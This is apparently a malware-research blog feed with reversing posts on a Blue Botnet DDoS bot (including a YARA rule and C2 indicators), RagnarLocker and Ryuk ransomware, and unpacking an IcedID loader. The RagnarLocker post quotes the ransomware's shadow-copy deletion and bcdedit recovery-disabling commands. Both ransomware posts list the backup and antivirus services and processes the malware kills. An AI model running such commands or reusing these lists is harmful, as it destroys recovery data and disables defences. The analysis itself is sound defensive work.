&lt;h2 id=&quot;analysis-of-a-blue-bot-sample&quot;&gt;Analysis of a blue bot sample&lt;/h2&gt;

&lt;p&gt;The blue bot sample found on the open directory is a .net binary:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vlauto.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After opening it in a PE viewer an interesting pdb can be found:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:\Users\huggye\Documents\Visual Studio 2013\Projects\Blue Botnet\Blue Botnet\obj\Debug\file.pdb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This pdb is similar to the pdb of the blue bot builder that is published on the Internet:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c:\Users\huggye\Documents\Visual Studio 2013\Projects\Blue Botnet Bot Builder\Blue Botnet Bot Builder\obj\Debug\Blue Botnet Bot Builder.pdb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The structure of this .net PE file already gives a good overview of what this samples does:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/Screenshot_2020-11-28_17-47-34.png&quot; alt=&quot;bluebot&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This bot starts by parsing the hardcoded c2 config and sets persistence by adding itself to the startup programs or by adding a run key in the windows registry:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201130234456922.png&quot; alt=&quot;image-20201130234456922&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then it parses the following two lists from the webroot of the c2 server, proxy and blog, respectively:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201130234849891.png&quot; alt=&quot;image-20201130234849891&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, it parses the targets by reading the target files from the c2 webroot:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201130235142694.png&quot; alt=&quot;image-20201130235142694&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, it launches an attack to the target and it creates two threads, one for updating the targets and other to update the lists:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201130235316085.png&quot; alt=&quot;image-20201130235316085&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here’s a yara rule to detect a blue bot sample:&lt;/p&gt;

&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s&quot;&gt;rule malware_ddos_bluebot&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;meta&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;author = &quot;_j&quot;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;date = &quot;2020-11&quot;&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;strings&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$pdb_bot = &quot;c&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;\\Users\\huggye\\Documents\\Visual Studio 2013\\Projects\\Blue Botnet\\Blue Botnet\\obj\\Debug\\file.pdb&quot; wide ascii&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$pdb_builder = &quot;c&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;\\Users\\huggye\\Documents\\Visual Studio 2013\\Projects\\Blue Botnet Bot Builder\\Blue Botnet Bot Builder\\obj\\Debug\\Blue Botnet Bot Builder.pdb&quot; wide ascii&lt;/span&gt;

        &lt;span class=&quot;nv&quot;&gt;$str1 = &quot;DoSAttack&quot; wide ascii&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$str2 = &quot;Blue_Botnet&quot; wide ascii&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$str3 = &quot;botlogger.php&quot; wide ascii&lt;/span&gt;

        &lt;span class=&quot;nv&quot;&gt;$persistence1 = &quot;C&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\drvhandler.exe&quot; wide ascii&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$persistence2 = &quot;C&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;\\ProgramData\\Microsoft\\Windows\\Menu Start\\Programmi\\Esecuzione Automatica\\drvhandler.exe&quot; wide ascii&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;condition&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;uint16(0) == 0x5a4d&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;		&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;and (any of ($pdb*))&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;		&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;or (all of ($str*))&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;		&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;or (all of ($persistence*) and 1 of ($str*))&lt;/span&gt;
&lt;span class=&quot;pi&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;hunting-more-samples&quot;&gt;Hunting more samples&lt;/h2&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Domain&lt;/th&gt;
      &lt;th&gt;jx2-bavuong.com&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;IP&lt;/td&gt;
      &lt;td&gt;158.247.208.239&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Registrar&lt;/td&gt;
      &lt;td&gt;GMO Internet, Inc. d/b/a Onamae.com&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;On VirusTotal it was possible to find more malware samples related to this domain:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201129213528274.png&quot; alt=&quot;image-20201129213528274&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From these samples, only two are the blue bot payload:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201129215819455.png&quot; alt=&quot;image-20201129215819455&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The other samples are mostly downloaders and after running them the &lt;a href=&quot;https://www.virustotal.com/graph/embed/g1b8b3022ef6b4fc8b06361dbb6de4e5672f0b47d16f34bf3b9c4650102d3f6a3&quot;&gt;VTI&lt;/a&gt; to extract new indicators, graph escalated quickly:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/random_blue_botnet/image-20201130224902607.png&quot; alt=&quot;image-20201130224902607&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The following domains are related with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;jx2-bavuong.com&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;volamthanthoai.net
up2.vlhoiucvn.com
volam2.club
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;to-wrap-up&quot;&gt;To wrap-up&lt;/h2&gt;

&lt;p&gt;I decided to take a look at this panel because I never saw it before and it was a good opportunity to do some hunting and try to find more context about the panel. It seems that the actor behind this botnet speaks Vietnamese but I’m not sure if this botnet is still alive since the way that the panel registers bots is not reliable…&lt;/p&gt;</content><author><name>foo</name></author><category term="malware" /><summary type="html">Panel Overview</summary></entry><entry><title type="html">RagnarLocker Ransomware</title><link href="http://blog.reversing.xyz/ragnarlocker.html" rel="alternate" type="text/html" title="RagnarLocker Ransomware" /><published>2020-11-26T00:00:00+00:00</published><updated>2020-11-26T00:00:00+00:00</updated><id>http://blog.reversing.xyz/ragnarlocker</id><content type="html" xml:base="http://blog.reversing.xyz/ragnarlocker.html">&lt;p&gt;This blog post is about my findings after reversing a ragnar locker sample.&lt;/p&gt;

&lt;h2 id=&quot;checking-operating-system-language&quot;&gt;Checking Operating System Language&lt;/h2&gt;

&lt;p&gt;Ragnar starts by the checking the language of the operating system and if it matches any of the following blacklisted languages it will terminate the process:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ragnarlocker/image-20201126150804102.png&quot; alt=&quot;image-20201126150804102&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Blacklisted Languages:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Azerbaijan
Armenian
Belorussia
Kazakh
Kyrgyz
Moldavian
Tajik
Russian
Turkmen
Uzbek
Ukrainian
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;disabling-windows-system-restore&quot;&gt;Disabling Windows System Restore&lt;/h2&gt;

&lt;p&gt;Ragnar will try to disable the capability of windows to restore itself to a previous saved state. Ragnar does this by creating five new processes to run five different command as seen below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ragnarlocker/image-20201126164039109.png&quot; alt=&quot;image-20201126164039109&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The following commands will delete the windows shadow copies and disable windows automatic repair:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vssadmin delete shadows /all / quiet
wmic.exe shadowcopy delete
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy IgnoreAllFailures
bcdedit /set {globalsettings} advancedoptions false
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;killing-processes-and-services&quot;&gt;Killing Processes And Services&lt;/h2&gt;

&lt;p&gt;Ragnar will create two threads to search for specific processes and services to kill them:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ragnarlocker/image-20201126170256229.png&quot; alt=&quot;image-20201126170256229&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The strings are stored encrypted.&lt;/p&gt;

&lt;p&gt;List of services to kill:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vss,sql,memtas,mepocs,sophos,veeam,backup,pulseway,logme,logmein,connectwise,splashtop,mysql,Dfs,vmms,vmcompute,Hyper-v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;List of processes to kill:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sql,mysql,veeam,oracle,ocssd,dbsnmp,synctime,agntsvc,isqlplussvc,xfssvccon,mydesktopservice,ocautoupds,encsvc,firefox,tbirdconfig,mydesktopqos,ocomm,dbeng50,sqbcoreservice,excel,infopath,msaccess,mspub,onenote,outlook,powerpnt,steam,thebat,thunderbird,visio,winword,wordpad,EduLink2SIMS,bengine,benetns,beserver,pvlsvr,beremote,VxLockdownServer,postgres,fdhost,WSSADMIN,wsstracing,OWSTIMER,dfssvc.exe,dfsrs.exe,swc_service.exe,sophos,SAVAdminService,SavService.exe,Hyper-v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;file-encryption&quot;&gt;File Encryption&lt;/h2&gt;

&lt;p&gt;Ragnar first forces all hidden volumes to be mounted before starting encrypting any files:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ragnarlocker/image-20201126163206180.png&quot; alt=&quot;image-20201126163206180&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then it starts iterating through the local system files and encrypt them using the Microsoft CryptoAPI to encrypt the files using RSA crypto.&lt;/p&gt;

&lt;p&gt;Ragnar imports a RSA public key (which is stored encrypted and decrypted on runtime) to encrypt the files.&lt;/p&gt;

&lt;p&gt;Extracted RSA key:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ragnarlocker/image-20201126175354113.png&quot; alt=&quot;image-20201126175354113&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Importing the RSA key:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ragnarlocker/image-20201126175736575.png&quot; alt=&quot;image-20201126175736575&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, Ragnar encrypts all the files that were found on the mounted volumes however the following file names, folders and extensions are whitelisted:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;autorun.inf
boot.ini
bootfont.bin
bootsect.bak
bootmgr
bootmgr.efi
bootmgfw.efi
desktop.ini
iconcache.db
ntldr
ntuser.dat
ntuser.dat.log
ntuser.ini
thumbs.db
.db
.sys
.dll
.lnk
.msi
.drv
.exe
Windows
Windows.old
Tor browser
Internet Explorer
Google
Opera
Opera Software
Mozilla
Mozilla Firefox
$Recycle.Bin
ProgramData
All Users
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ragnar also adds some metadata to the end of every encrypted file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ragnarlocker/image-20201127104730835.png&quot; alt=&quot;image-20201127104730835&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the following image we can see the encrypted files and the ransomnote which was written to a txt file:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ragnarlocker/image-20201127105752208.png&quot; alt=&quot;image-20201127105752208&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;ransomnote&quot;&gt;Ransomnote&lt;/h2&gt;

&lt;p&gt;As seen in the previous section Ragnar writes a txt file with the ransomnote inside of it. The filename follows the following schema: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!$R4GN4R_XXX$!.txt&lt;/code&gt; where XXX is a custom id based on the computer name:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ragnarlocker/image-20201127110750623.png&quot; alt=&quot;image-20201127110750623&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The ransomnote is encrypted inside the binary and it is decrypted on runtime.&lt;/p&gt;

&lt;p&gt;In the following image it’s possible to see the decrypted ransomnote:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ragnarlocker/image-20201127111410839.png&quot; alt=&quot;image-20201127111410839&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;command-line-options&quot;&gt;Command Line Options&lt;/h2&gt;

&lt;p&gt;Ragnar locker payload support a few command line arguments such as:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-backup
-list
-force
-vm
-vmback
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The difference on the behavior of this sample when we run it with command line arguments are minor. However, there were some intrusions where the samples of Ragnar Locker came with a VM image to encrypt the host files from inside the VM to avoid detections.&lt;/p&gt;

&lt;h2 id=&quot;to-wrap-up&quot;&gt;To wrap-up&lt;/h2&gt;

&lt;p&gt;This sample of Ragnar Locker was first seen on VirusTotal on July 2020 as seen below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ragnarlocker/image-20201127112344952.png&quot; alt=&quot;image-20201127112344952&quot; /&gt;&lt;/p&gt;

&lt;p&gt;SHA256:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;04C9CC0D1577D5EE54A4E2D4DD12F17011D13703CDD0E6EFD46718D14FD9AA87
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As seen on the ransomnote this payload was targeting CWT company which is a travel agency. Since no data of this company was leaked by the Ragnar Locker gang it looks that this company actually paid the ransom which was $4.5M.&lt;/p&gt;</content><author><name>foo</name></author><category term="malware" /><summary type="html">This blog post is about my findings after reversing a ragnar locker sample.</summary></entry><entry><title type="html">Unpacking an IcedID loader</title><link href="http://blog.reversing.xyz/unpacking-icedid-loader.html" rel="alternate" type="text/html" title="Unpacking an IcedID loader" /><published>2020-11-16T00:00:00+00:00</published><updated>2020-11-16T00:00:00+00:00</updated><id>http://blog.reversing.xyz/unpacking_icedid_loader</id><content type="html" xml:base="http://blog.reversing.xyz/unpacking-icedid-loader.html">&lt;p&gt;In this blog post I will show how to unpack a recent IcedId loader. The file that I’m going to unpack is available &lt;a href=&quot;https://bazaar.abuse.ch/sample/4734648ab6553ba7bfb89776ac59a6ce1d71828ce69ef2e39e985a14e60f1372/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;Before starting let’s understand what is a packer. Basically, to malware developers the goal of using a packer is to protect the final payload/executable file not only from anti virus but also from malware analysts by increasing as much as possible the time required for analysis.&lt;/p&gt;

&lt;p&gt;After packing an executable, the new executable will contain 2 important things: the unpacking stub and the encrypted/compressed executable.&lt;/p&gt;

&lt;p&gt;Now it comes the question, what is an unpacking stub? The unpacking stub is basically a piece of shellcode that will decrypt/decompress the packed code, allocate memory for it and transfer the execution to the original entry point (aka OEP). Although, some packers will try to inject the unpacked code to a remote process, so it’s not always going to be equal when it comes to unpack code!&lt;/p&gt;

&lt;h2 id=&quot;unpacking-icedid&quot;&gt;Unpacking IcedId&lt;/h2&gt;

&lt;p&gt;So, IcedId loaders normally do self injection which means that they will decrypt and decompress the packed code and somehow transfer execution to it inside of it’s own process memory. Note, that I will not be deep diving into the packing routine here and just on how to get the final unpacked executable.&lt;/p&gt;

&lt;p&gt;So for this one, let’s start by placing a breakpoint on VirtualAlloc and VirtualProtect:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/unpacking_icedid_loader/image-20201116220607458.png&quot; alt=&quot;image-20201116220607458&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/unpacking_icedid_loader/image-20201116220645144.png&quot; alt=&quot;image-20201116220645144&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, let’s execute until we hit the breakpoint at VirtualAlloc for the second time and execute until return (&lt;strong&gt;CTRL&lt;/strong&gt; + &lt;strong&gt;F9&lt;/strong&gt;) to check the EAX value on the dump window:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/unpacking_icedid_loader/image-20201116220912006.png&quot; alt=&quot;image-20201116220912006&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s empty as expected, as it’s a new memory region. Let’s continue by pressing &lt;strong&gt;F9&lt;/strong&gt; and we should break again at VirtualAlloc. This time if we look close EDI is pointing to the string “PE”:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/unpacking_icedid_loader/image-20201116221203583.png&quot; alt=&quot;image-20201116221203583&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we follow the address on the dump window we should see a new PE file in memory:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/unpacking_icedid_loader/image-20201116221527131.png&quot; alt=&quot;image-20201116221527131&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So now all we have left to do is to select all the bytes since the beginning of the MZ header until the end of the section,copy the bytes (&lt;strong&gt;right click on the selected bytes&lt;/strong&gt; &amp;gt; &lt;strong&gt;Binary&lt;/strong&gt; &amp;gt; &lt;strong&gt;Binary&lt;/strong&gt; &lt;strong&gt;Copy&lt;/strong&gt;) and paste it on an hex editor like HxD:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/unpacking_icedid_loader/image-20201116221901826.png&quot; alt=&quot;image-20201116221901826&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cool, so now let’s save it to disk and check if it’s all good on a PE viewer:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/unpacking_icedid_loader/image-20201116222000504.png&quot; alt=&quot;image-20201116222000504&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The unpacked executable looks like it’s all correct. All the imports are there and there are no problems on the section headers since the executable wasn’t mapped to memory.&lt;/p&gt;

&lt;p&gt;Imports:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/unpacking_icedid_loader/image-20201116222115231.png&quot; alt=&quot;image-20201116222115231&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Section Headers:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/unpacking_icedid_loader/image-20201116222207007.png&quot; alt=&quot;image-20201116222207007&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That’s all, we successfully unpacked an IcedId loader. IDA should open the file with no problems!&lt;/p&gt;

&lt;p&gt;Note that this is not the final payload of IcedId, this one will be actually downloading the final payload from the C2.&lt;/p&gt;</content><author><name>foo</name></author><category term="malware" /><summary type="html">In this blog post I will show how to unpack a recent IcedId loader. The file that I’m going to unpack is available here.</summary></entry><entry><title type="html">Ryuk Ransomware</title><link href="http://blog.reversing.xyz/ryuk.html" rel="alternate" type="text/html" title="Ryuk Ransomware" /><published>2020-11-14T00:00:00+00:00</published><updated>2020-11-14T00:00:00+00:00</updated><id>http://blog.reversing.xyz/ryuk</id><content type="html" xml:base="http://blog.reversing.xyz/ryuk.html">&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;Given all the talk about UNC1878 and the deployment of Ryuk ransomware I decided to take a look at a Ryuk sample, reverse engineer it and write about the findings.&lt;/p&gt;

&lt;p&gt;As described by several sources the timeline of these campaigns goes by the following:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1) Maldoc
2) Trickbot / BazarBackdoor
3) Cobalt Strike and other OST tools
4) RYUK deployment
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;command-line-arguments&quot;&gt;Command line arguments&lt;/h2&gt;

&lt;p&gt;When the samples runs without any arguments a new sample is created in the same directory with a random 7 character name:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201110163608350.png&quot; alt=&quot;image-20201110163608350&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Arguments for CopyFileW:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201110163539013.png&quot; alt=&quot;image-20201110163539013&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The newly created copy is then executed with the following command line arguments “8 LAN”:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201110163844456.png&quot; alt=&quot;image-20201110163844456&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Arguments for ShellExecuteW:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201110163900914.png&quot; alt=&quot;image-20201110163900914&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is due to the fact that some Ryuk samples have a capability known as “Wake on Lan” for spreading on a network infrastructure. By writing a copy of itself and executing it while passing the arguments “8 LAN”:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201113165732463.png&quot; alt=&quot;image-20201113165732463&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When the sample runs with the arguments “8 LAN” it will sleep and wait before starting all the encryption routines.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201113164123370.png&quot; alt=&quot;image-20201113164123370&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;killing-services-and-processes&quot;&gt;Killing Services and Processes&lt;/h2&gt;

&lt;p&gt;Ryuk will check the version of windows and if it’s a newer version it will start a new thread to kill a list of processes and services, using net.exe and taskkill.exe, respectively:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201113192914287.png&quot; alt=&quot;image-20201113192914287&quot; /&gt;&lt;/p&gt;

&lt;p&gt;List of processes to kill:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;virtual
vmcomp
vmwp
veeam
backup
Backup
xchange
sql
dbeng
sofos
calc
ekrn
zoolz
encsvc
excel
firefoxconfig
infopath
msaccess
mspub
mydesktop
ocautoupds
ocomm
ocssd
onenote
oracle
outlook
powerpnt
sqbcoreservice
steam
synctime
tbirdconfig
thebat
thunderbird
visio
word
xfssvccon
tmlisten
PccNTMon
CNTAoSMgr
Ntrtscan
mbamtray
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;List of services to kill:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vmcomp
vmwp
veeam
Back
xchange
ackup
acronis
sql
Enterprise
Sophos
Veeam
AcrSch
Antivirus
Antivirus
bedbg
DCAgent
EPSecurity
EPUpdate
Eraser
EsgShKernel
FA_Scheduler
IISAdmin
IMAP4
MBAM
Endpoint
Afee
McShield
task
mfemms
mfevtp
mms
MsDts
Exchange
ntrt
PDVF
POP3
Report
RESvc
sacsvr
SAVAdmin
SamS
SDRSVC
SepMaster
Monitor
Smcinst
SmcService
SMTP
SNAC
swi_
CCSF
TrueKey
tmlisten
UI0Detect
W3S
WRSVC
NetMsmq
ekrn
EhttpSrv
ESHASRV
AVP
klnagent
wbengine
KAVF
mfefire
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;Ryuk escalates privilege by modifying its own process access token to give himself the “SeDebugPrivilege” as seen below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/malware_analysis/ryuk/image-20201113194229153.png&quot; alt=&quot;image-20201113194229153&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This type of privilege access is needed to the process injection component.&lt;/p&gt;

&lt;h2 id=&quot;process-injection&quot;&gt;Process Injection&lt;/h2&gt;

&lt;p&gt;It tries to inject itself to the list of running processes. The following processes are blacklisted:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;explorer.exe
lsaas.exe
csrss.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To do the process injection it uses the classic combination of OpenProcess, WriteProcessMemory and CreateRemoteThread apis.&lt;/p&gt;

&lt;h2 id=&quot;dynamic-api-resolving&quot;&gt;Dynamic API resolving&lt;/h2&gt;

&lt;p&gt;A large list of apis are dynamically resolved. The dll and api names are encrypted and after reversing the algorithm used to decrypt the strings it was possible to extract them:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[+] Decrypted apis:

Offset: 0 Decrypted String: LoadLibraryA
Offset: 50 Decrypted String: VirtualFree
Offset: 100 Decrypted String: FindFirstFileW
Offset: 150 Decrypted String: FindNextFileW
Offset: 200 Decrypted String: GetModuleFileNameA
Offset: 250 Decrypted String: Wow64RevertWow64FsRedirection
Offset: 300 Decrypted String: SetFilePointer
Offset: 350 Decrypted String: CreateFileA
